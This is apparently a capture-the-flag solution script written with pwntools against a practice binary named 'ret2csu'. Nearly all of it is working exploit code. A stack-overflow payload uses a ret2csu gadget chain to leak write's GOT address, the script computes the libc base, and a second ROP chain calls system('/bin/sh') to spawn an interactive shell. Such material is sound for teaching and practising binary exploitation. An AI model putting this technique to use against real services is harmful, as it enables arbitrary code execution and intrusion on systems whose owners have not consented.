#-*- coding:utf-8 -*-

from pwn import *
# import duchao_pwn_script
context(log_level='debug',arch='amd64', os='linux')
pwnfile= './ret2csu'
io = process('ret2csu')
# io = remote('node5.anna.nssctf.cn',28705)
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc_file_path = './libc.so.6' 
libc = ELF(libc_file_path)

padding = 0x108
leak_func_name ='write'  
leak_func_got = elf.got[leak_func_name]

return_addr = elf.symbols['vuln']
# write_sym = 0x404018
write_sym = 0x404018
# 404018

pop_rdi_ret = 0x4012b3
pop_rsi_r15_ret = 0x4012b1
# gdb.attach(io)
# pause()

pop_rbx_addr = 0x4012AA #在ida找
rbx=0
rbp=1
r12=1 #arg1 rdi
r13=leak_func_got #arg2 rsi
r14=8 #arg3 rdx 
r15 = write_sym #call func
mov_rdx_r14_addr = 0x401290 #在ida找

payload  = b'a'* padding 
payload += flat([pop_rbx_addr , rbx , rbp , r12 , r13 , r14 , r15 , mov_rdx_r14_addr])
payload +=  p64(0xdeadbeef)*7 + p64(return_addr)

delimiter = 'Input:\n'
io.sendlineafter(delimiter, payload)

# pause()
# u64 => 0x0b 0x12 0x40 0x00 0x00 0x00 0x00 0x00
# u32 => 0x0b 0x12 0x40 0x00
# u16 => 0x0b 0x12
# u8  => 0x0b
# struct.unpack

io.recvuntil(b'Ok.\n')
write_addr = u64(io.recv(6).ljust(8,b'\x00'))
# wirte_addr = u64(io.recv(7).ljust(8,b'\x00'))
success('wirte_addr:'+hex(write_addr))
libc_base = write_addr - libc.sym['write']
# libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['write']
print('libc_base',hex(libc_base))
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

success('libc_base:'+hex(libc_base))


# system_addr, bin_sh_addr = duchao_pwn_script.libcsearch_sys_sh(leak_func_name, write_addr)
# print(hex(system_addr))
# print(hex(bin_sh_addr))

'''
wirte_offset = 0xEEF20
libc_addr = write_addr - wirte_offset
print('libc_addr:',hex(libc_addr))

system_offset = 0x48E50
system_addr = libc_addr + system_offset
print('system_addr:',hex(system_addr))

bin_sh_offset = 0x18A156-4
bin_sh_addr = libc_addr + bin_sh_offset
print('bin_sh_addr:',hex(bin_sh_addr))

gdb.attach(io)
pause()

'''
ret = 0x40101a
# io.recvuntil('Ok.\n')
payload2 = b'a'* padding + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
# delimiter = 'Input:\n'
io.sendline(payload2)
# pause()
io.interactive()
